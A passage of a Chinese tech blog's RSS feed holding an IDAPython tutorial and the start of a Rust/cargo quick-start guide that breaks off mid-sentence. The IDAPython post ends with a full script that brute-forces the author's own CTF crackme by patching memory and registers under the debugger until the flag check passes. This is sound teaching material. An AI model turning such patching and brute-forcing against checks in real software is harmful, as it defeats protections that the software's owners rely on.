      <pubDate>Fri, 23 Feb 2024 13:15:03 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;IDA-Python入门（todo）&quot;&gt;&lt;a href=&quot;#IDA-Python入门（todo）&quot; class=&quot;headerlink&quot; title=&quot;IDA Python入门（todo）&quot;&gt;&lt;/a&gt;IDA Python入门（todo）&lt;/h1&gt;&lt;p&gt;ida pro7.7已经基本普及了，所以本篇文章是基于ida pro77和python3环境编写。&lt;/p&gt;
&lt;p&gt;不可否认的是ida pro在静态分析上极为强大，不过动调方面还是比起其他工具稍显不足，而idapython提供了大量的ida的api，能一定程度上缓解动调的缺陷，这里就给大家简单介绍一下（&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;PS：参考了Q神的 &lt;a href=&quot;http://www.qfrost.com/posts/ctf/idapython&quot;&gt;http://www.qfrost.com/posts/ctf/idapython&lt;/a&gt; ，并且修正为了新版ida python的api&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="IDA-Python入门（todo）"><a href="#IDA-Python入门（todo）" class="headerlink" title="IDA Python入门（todo）"></a>IDA Python入门（todo）</h1><p>ida pro7.7已经基本普及了，所以本篇文章是基于ida pro77和python3环境编写。</p><p>不可否认的是ida pro在静态分析上极为强大，不过动调方面还是比起其他工具稍显不足，而idapython提供了大量的ida的api，能一定程度上缓解动调的缺陷，这里就给大家简单介绍一下（</p><p><em><strong>PS：参考了Q神的 <a href="http://www.qfrost.com/posts/ctf/idapython">http://www.qfrost.com/posts/ctf/idapython</a> ，并且修正为了新版ida python的api</strong></em></p><span id="more"></span><p><img src="/idapython%E5%85%A5%E9%97%A8/image-20240223213616667.png" alt="image-20240223213616667"></p><p><img src="/idapython%E5%85%A5%E9%97%A8/image-20240223221902702.png" alt="image-20240223221902702"></p><p><strong>指令相关：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idaapi <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ida_dbg <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 返回目标地址指向的指令的前一条指令的地址</span></span><br><span class="line"><span class="comment"># 参数一是查找的开始地址，参数二是往前查找的最小地址（在范围内）</span></span><br><span class="line">prev_1 = prev_head(<span class="number">0x00007FF6A1AA2577</span>, <span class="number">1</span>)</span><br><span class="line">prev_2 = prev_head(<span class="number">0x00007FF6A1AA257a</span>, <span class="number">0x00007FF6A1AA2578</span>)<span class="comment"># fail</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(prev_1), <span class="built_in">hex</span>(prev_2))</span><br><span class="line">&gt;&gt; <span class="number">0x7ff6a1aa2573</span> <span class="number">0xffffffffffffffff</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回目标地址指向的指令的后一条指令的地址</span></span><br><span class="line"><span class="comment"># 参数一是查找开始地址，参数二是往后查找的最大地址（不在范围内）</span></span><br><span class="line">next_1 = next_head(<span class="number">0x00007FF6A1AA257a</span>, <span class="number">1</span>)<span class="comment"># fail</span></span><br><span class="line">next_2 = next_head(<span class="number">0x00007FF6A1AA257a</span>, <span class="number">0x00007FF6A1AA2580</span>)</span><br><span class="line">&gt;&gt; <span class="number">0xffffffffffffffff</span> <span class="number">0x7ff6a1aa257b</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出目标地址的反汇编语句（就是有一点点乱码x）</span></span><br><span class="line">a = generate_disasm_line(<span class="number">0x00007FF6A1AA2585</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">&gt;&gt; <span class="string">b&#x27;\x01\x05movzx\x02\x05   \x01)\x01!eax\x02!\x02)\x01\t,\x02\t \x01*\x01 byte ptr\x02  \x01\t[\x02\t\x01!r10\x02!\x01\t]\x02\t\x02*&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取目标地址指令</span></span><br><span class="line">a = print_insn_mnem(<span class="number">0x00007FF6A1AA2585</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">&gt;&gt; movzx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取目标地址的某个操作数（按索引取）</span></span><br><span class="line">a = print_operand(<span class="number">0x00007FF6A1AA2585</span>, <span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">&gt;&gt; <span class="string">b&#x27;\x01)\x01!eax\x02!\x02)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取目标地址某个操作数的值（按索引取）</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(get_operand_value(<span class="number">0x00007FF6A1AA2577</span>, <span class="number">1</span>)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(get_operand_value(<span class="number">0x00007FF6A1AA2577</span>, <span class="number">1</span>)))</span><br><span class="line">&gt;&gt; <span class="number">0x10</span></span><br><span class="line">&gt;&gt; &lt;<span class="keyword">class</span> <span class="string">&#x27;int&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取目标地址字符串，参数二是长度，参数三是string的类型</span></span><br><span class="line">a = get_strlit_contents(<span class="number">0x00007FF6A1AC28A8</span>, <span class="number">4</span>, <span class="number">0</span>)</span><br><span class="line">b = get_strlit_contents(<span class="number">0x00007FF6A1AC28A8</span>, <span class="number">4</span>, <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">&gt;&gt; <span class="string">b&#x27;Erro&#x27;</span></span><br><span class="line">&gt;&gt; <span class="string">b&#x27;\xe7\x89\x85\xe6\xbd\xb2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在目标地址添加注释，参数三为True则不会替换comment</span></span><br><span class="line">a = set_cmt(<span class="number">0x00007FF6A1AA2577</span>, <span class="string">&quot;this is a comment&quot;</span>, <span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">&gt;&gt; <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 给目标地址的变量改名</span></span><br><span class="line">a = set_name(<span class="number">0x00007FF6A1AC28A8</span>, <span class="string">&quot;err&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">&gt;&gt; <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前光标处地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(get_screen_ea()))</span><br><span class="line">&gt;&gt; <span class="number">0x7ff6a1ac28a8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 统计目标地址所在函数有多少个基本块</span></span><br><span class="line"><span class="built_in">print</span>(FlowChart(get_func(<span class="number">0x00007FF6A1AA21B0</span>)).size)</span><br><span class="line">&gt;&gt; <span class="number">149</span></span><br></pre></td></tr></table></figure><p><strong>功能+调试相关：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置断点</span></span><br><span class="line">add_bpt(<span class="number">0x00007FF6A1AA2577</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除断点</span></span><br><span class="line">del_bpt(<span class="number">0x00007FF6A1AA2577</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置断点是否开启</span></span><br><span class="line">enable_bpt(<span class="number">0x00007FF6A1AA2577</span>, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置idapython为默认语言，在设置条件断点时不设置会默认使用idc</span></span><br><span class="line">load_and_run_plugin(<span class="string">&quot;idapython&quot;</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">condition</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; rip:&quot;</span>, get_reg_val(<span class="string">&quot;rip&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">add_bpt(<span class="number">0x00007FF6011D2581</span>)</span><br><span class="line"><span class="comment"># 设置条件断点，每次运行到这个断点停下会触发condition</span></span><br><span class="line">set_bpt_cond(<span class="number">0x00007FF6011D2581</span>, <span class="string">&quot;condition()&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看交叉引用，返回一个迭代器，包含idautils._xref对象</span></span><br><span class="line">a = XrefsTo(<span class="number">0x00007FF6011D2577</span>, flags=<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(addr.frm))<span class="comment"># .frm 返回交叉引用地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读/写 1/2/4/8字节， wide是宽字节</span></span><br><span class="line">get_byte(addr)</span><br><span class="line">get_word(addr)</span><br><span class="line">get_dword(addr)</span><br><span class="line">get_qword(addr)</span><br><span class="line">get_wide_byte(addr)</span><br><span class="line">get_wide_word(addr)</span><br><span class="line">get_wide_dword(addr)</span><br><span class="line">get_wide_qword(addr)</span><br><span class="line">patch_byte(addr, val)</span><br><span class="line">patch_word(addr, val)</span><br><span class="line">patch_dword(addr, val)</span><br><span class="line">patch_qword(addr, val)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取寄存器rip的值</span></span><br><span class="line">get_reg_val(<span class="string">&quot;rip&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置寄存器rax的值为0x10</span></span><br><span class="line">set_reg_val(<span class="string">&quot;rax&quot;</span>, <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开始调试</span></span><br><span class="line">start_process()</span><br><span class="line"><span class="comment"># continue</span></span><br><span class="line">continue_process()</span><br><span class="line"><span class="comment"># 运行到目标地址</span></span><br><span class="line">run_to(addr)</span><br><span class="line"><span class="comment"># 获取并清除调试器事件代码，普通代码返回0x20，断点、ret返回0x10，程序结束返回负数</span></span><br><span class="line"><span class="comment"># 必须在进程执行的代码后面调用该函数，以便检索调试器的事件代码，否则可能会阻止后续尝试</span></span><br><span class="line">wait_for_next_event(EVENT_TYPE, flags)</span><br><span class="line"><span class="comment"># 单步</span></span><br><span class="line">step_over()</span><br><span class="line">wait_for_next_event(WFNE_SUSP, -<span class="number">1</span>) <span class="comment"># 每次step_over都要调用一次，continue这些也是</span></span><br><span class="line"><span class="comment"># 事件 WFNE_SUSP 将等待导致被调试进程挂起的事件，比如异常或断点</span></span><br><span class="line"><span class="comment"># 事件 WFNE_CONT 可以恢复被挂起的进程，继续执行</span></span><br><span class="line"><span class="comment"># example:</span></span><br><span class="line">wait_for_next_event(WFNE_SUSP, -<span class="number">1</span>)</span><br><span class="line">wait_for_next_event(WFNE_ANY | WFNE_CONT, -<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h1 id="实战：使用IDApython编写爆破脚本"><a href="#实战：使用IDApython编写爆破脚本" class="headerlink" title="实战：使用IDApython编写爆破脚本"></a>实战：使用IDApython编写爆破脚本</h1><p><strong>PS：使用我给SICTF Round3出的Re题Closeme作为例子</strong></p><p>附件： <a href="../resources/re_asset/closeme_release.zip" target="_block">点击下载附件</a></p><p>这题说实话预期就是爆破（x</p><p>大概回顾一下题目，每次创建几个窗口后都会弹出一个messagebox，点击yes&#x2F;no会被储存为1&#x2F;0，然后长度为16时就check一次，所以先把CreateWindowsEx和MessageBoxW那里的call xxx给nop掉（你也不想开几千上万个窗口把cpu干烧了吧x），然后就需要手动添加各种值了。</p><p>因为每16次循环才能使长度达到16进而check，太影响效率了，所以直接在原来call messagebox那里patch成jmp到cmp rax, 10h这里。</p><p>rax是长度，直接jmp过来就没有调用获取长度的函数，我们需要手动设置0x10</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">breakpoint_addr = <span class="number">0x00007FF6A1AA2577</span></span><br><span class="line">add_bpt(breakpoint_addr)</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">rip = get_reg_val(<span class="string">&quot;RIP&quot;</span>)</span><br><span class="line"><span class="comment">#print(&quot;rip: &quot;, hex(rip))</span></span><br><span class="line"><span class="keyword">if</span> rip == breakpoint_addr:</span><br><span class="line">    set_reg_val(<span class="string">&quot;rax&quot;</span>, <span class="number">0x10</span>)</span><br></pre></td></tr></table></figure><p><img src="/idapython%E5%85%A5%E9%97%A8/image-20240224010303964.png" alt="image-20240224010303964"></p><p>但是再执行两步就会把一个局部变量取出来解一层引用给r10，后续就是16个比较，所以r10应该是一个指向我们储存16个1或0的地址。</p><p>那么我们要伪造2层，一是先把那个局部变量的值修改为一个可写地址（同时也要保证运行时不会有其他的写者），然后二是在这个可写地址写入我们爆破的数据。</p><p>我直接找了.data段最末尾的0x10的空间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># .data section</span></span><br><span class="line">buf_addr = <span class="number">0x7FF6A1ACDFF0</span></span><br><span class="line">patch_qword(get_reg_val(<span class="string">&quot;rbp&quot;</span>) + <span class="number">0x38</span>, buf_addr) <span class="comment"># 写入局部变量</span></span><br></pre></td></tr></table></figure><p>然后写入要爆破的数据需要注意端序问题（</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">send = <span class="comment"># 你要爆破的数据， 比如 0101010101010101</span></span><br><span class="line">left = <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27;0&#x27;</span>.join(send[:<span class="number">8</span>][::-<span class="number">1</span>])</span><br><span class="line">left = <span class="built_in">int</span>(left, <span class="number">16</span>)</span><br><span class="line">right = <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27;0&#x27;</span>.join(send[<span class="number">8</span>:][::-<span class="number">1</span>])</span><br><span class="line">right = <span class="built_in">int</span>(right, <span class="number">16</span>)</span><br><span class="line">patch_qword(buf_addr, left)</span><br><span class="line">patch_qword(buf_addr + <span class="number">8</span>, right)</span><br></pre></td></tr></table></figure><p>然后就是爆破2^16次就行了！</p><p><strong>完整爆破脚本：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idaapi <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ida_dbg <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">this_input = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">start = <span class="number">0x00007FF6530D220F</span></span><br><span class="line"><span class="comment">#add_bpt(start)</span></span><br><span class="line">breakpoint_addr = <span class="number">0x00007FF6A1AA2577</span></span><br><span class="line">add_bpt(breakpoint_addr)</span><br><span class="line">win_addr = <span class="number">0x00007FF6A1AA2993</span></span><br><span class="line">add_bpt(win_addr)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Start!&quot;</span>)</span><br><span class="line">start_process()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Waiting for next event...&quot;</span>)</span><br><span class="line">wait_for_next_event(WFNE_SUSP, -<span class="number">1</span>)</span><br><span class="line"><span class="comment"># .data section</span></span><br><span class="line">buf_addr = <span class="number">0x7FF6A1ACDFF0</span></span><br><span class="line">patch_qword(get_reg_val(<span class="string">&quot;rbp&quot;</span>) + <span class="number">0x38</span>, buf_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> this_input &gt;= <span class="number">0x10000</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Burst Finished.&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    send = <span class="built_in">bin</span>(this_input)[<span class="number">2</span>:].zfill(<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;send: &quot;</span>, send)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        rip = get_reg_val(<span class="string">&quot;RIP&quot;</span>)</span><br><span class="line">        <span class="comment">#print(&quot;rip: &quot;, hex(rip))</span></span><br><span class="line">        <span class="keyword">if</span> rip == breakpoint_addr:</span><br><span class="line">            set_reg_val(<span class="string">&quot;rax&quot;</span>, <span class="number">0x10</span>)</span><br><span class="line">            <span class="comment">#print(&quot;set rax to 0x10&quot;)</span></span><br><span class="line"></span><br><span class="line">            left = <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27;0&#x27;</span>.join(send[:<span class="number">8</span>][::-<span class="number">1</span>])</span><br><span class="line">            left = <span class="built_in">int</span>(left, <span class="number">16</span>)</span><br><span class="line">            right = <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27;0&#x27;</span>.join(send[<span class="number">8</span>:][::-<span class="number">1</span>])</span><br><span class="line">            right = <span class="built_in">int</span>(right, <span class="number">16</span>)</span><br><span class="line">            patch_qword(buf_addr, left)</span><br><span class="line">            patch_qword(buf_addr + <span class="number">8</span>, right)</span><br><span class="line">        <span class="keyword">elif</span> rip == win_addr:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;win&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flag: SICTF&#123;&quot;</span> + <span class="built_in">bin</span>(this_input - <span class="number">1</span>)[<span class="number">2</span>:].zfill(<span class="number">16</span>) + <span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        continue_process()</span><br><span class="line">        wait_for_next_event(WFNE_SUSP, -<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;err: &quot;</span>, e)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    this_input += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;out&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>http://hacbit.tech/idapython%E5%85%A5%E9%97%A8/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Rust-QuickStart</title>
      <link>http://hacbit.tech/Rust-QuickStart/</link>
      <guid>http://hacbit.tech/Rust-QuickStart/</guid>
      <pubDate>Sun, 26 Nov 2023 05:47:08 GMT</pubDate>
      
      <description>&lt;p&gt;&lt;em&gt;&lt;strong&gt;Include:&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;em&gt;&lt;strong&gt;This book?&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;em&gt;&lt;strong&gt;Before Start&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;em&gt;&lt;strong&gt;Quick Start with a small Game&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;em&gt;&lt;strong&gt;Improve your Rust code (TODO)&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;em&gt;&lt;strong&gt;Others (TODO)&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p><em><strong>Include:</strong></em></p><ul><li><p><em><strong>This book?</strong></em></p></li><li><p><em><strong>Before Start</strong></em></p></li><li><p><em><strong>Quick Start with a small Game</strong></em></p></li><li><p><em><strong>Improve your Rust code (TODO)</strong></em></p></li><li><p><em><strong>Others (TODO)</strong></em></p></li></ul><span id="more"></span><h1 id="This-book"><a href="#This-book" class="headerlink" title="This book?"></a>This book?</h1><p>本文是为<strong>已经有一定编程基础</strong>（像C&#x2F;Cpp, Python, Ruby, C#等）的读者所编写的Rust快速入门教程，因此本文会假定读者已经对通用的基本的编程语言中的概念（如类型，结构体，流程控制等）具有一定的了解。如果在此之前你没有学习过任何有关编程语言的知识，我们强烈建议你应该先去学习一门其他语言。</p><p>如果你有基础且对部分语言比较熟练，可以通过<strong>《Rust语言圣经》</strong>进行更加系统的学习。这本书可以在Rust官网找到， 或者你可以阅读这本不错的中译版：<a href="https://course.rs/%E3%80%82">https://course.rs/。</a> 另外对于这部分爷（先跪了 Orz），您们完全可以跳过第一阶段（Before Start &amp;&amp; Quick Start with a small Game），直接看后面的部分。</p><p>如果你想要快速上手写点什么东西，那么这本书将非常适合你！本书将会带你从一个小项目中逐步学习Rust，比较和其他语言的异同点。另外如果你学习过rust圣经，你可能会发现本书的知识点顺序和圣经差别很大，这是因为本书是以项目讲解为优先的，辅以知识点讲解，每个知识点我都会尽量放在一个比较合适的位置。</p><p>最后，祝各位能从中收获乐趣！</p><h1 id="Before-Start"><a href="#Before-Start" class="headerlink" title="Before Start"></a>Before Start</h1><h2 id="Install-Rust"><a href="#Install-Rust" class="headerlink" title="Install Rust"></a>Install Rust</h2><p>你可以通过Rust官网下载rustup-init，并在本机运行，根据提示安装。rustup会帮你安装好工具链和一些常用工具，比如cargo，rustc等，并且会添加到PATH，所以无须手动添加环境变量。</p><h2 id="Cargo-quick-start"><a href="#Cargo-quick-start" class="headerlink" title="Cargo quick-start"></a>Cargo quick-start</h2><p>cargo是rust自带的包管理器，拥有非常强大的功能，如果你熟练掌握cargo的使用你会很快爱上它~</p><p>本部分只介绍一些本人经常使用到的命令。</p><p><strong>help</strong>（应该一款正经的工具都该有help功能：D）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cargo help / cargo</span><br></pre></td></tr></table></figure><p><img src="/Rust-QuickStart/image-20231126143131252.png" alt="cargo_help"></p><blockquote><p>  如果你使用的cargo版本是2023-10-18之前的，可能没有颜色高亮</p></blockquote><p>你还可以用help命令来查看某个命令的详细信息，比如</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cargo help new</span><br></pre></td></tr></table></figure><blockquote><p>  这里不放图了，因为实在太长了：(</p></blockquote><p><strong>new</strong></p><p>通过<code>cargo new</code>在当前文件夹下创建一个新的项目文件夹，里面的结构大概是</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> D:\Rust<span class="literal">-test</span>&gt; cargo new hello</span><br><span class="line">     Created binary (application) `hello` package</span><br><span class="line"><span class="built_in">PS</span> D:\Rust<span class="literal">-test</span>&gt; <span class="built_in">cd</span> hello</span><br><span class="line"><span class="built_in">PS</span> D:\Rust<span class="literal">-test</span>\hello&gt; tree</span><br><span class="line">.</span><br><span class="line">├── Cargo.toml</span><br><span class="line">└── src</span><br><span class="line">    └── main.rs</span><br></pre></td></tr></table></figure><p>Cargo.toml里面是一些配置信息，比如name，version，author，dependence之类的。src文件夹存放你的rs源代码。</p><p><strong>build</strong></p><p>你可以通过build命令来编译当前项目，默认是debug，你可以通过<code>cargo build --release</code>指定为release，它会进行更加激进的优化，当然与之对应的是编译时间也会增加。如果你想要交叉编译到其他平台，比如windows编译到linux，你可以通过<code>cargo build --target x86_64-unknown-linux-musl</code>来指定平台。build命令生成的文件会放在target文件夹下，不同平台，debug，release是分开放的，所以无须担心会覆盖。</p><p><strong>run</strong></p><p><code>cargo run</code>实际上相当于执行了2个命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cargo build</span><br><span class="line">./target/debug/编译得到的可执行文件</span><br></pre></td></tr></table></figure><p>所以build命令的参数在run是可以用的。</p><p>使用new命令创建的项目中main.rs里默认内容是</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;Hello, world!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>快去run一下你的第一个rust程序吧：D</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> D:\Rust<span class="literal">-test</span>\hello&gt; cargo run</span><br><span class="line">   Compiling hello v0.<span class="number">1.0</span> (D:\Rust<span class="literal">-test</span>\hello)</span><br><span class="line">    Finished dev <span class="function">[<span class="type">unoptimized</span> + <span class="type">debuginfo</span>] <span class="title">target</span></span>(s) <span class="keyword">in</span> <span class="number">2.80</span>s</span><br><span class="line">     Running `target\debug\hello.exe`</span><br><span class="line">Hello, world!</span><br></pre></td></tr></table></figure><p><strong>check</strong></p><p><code>cargo 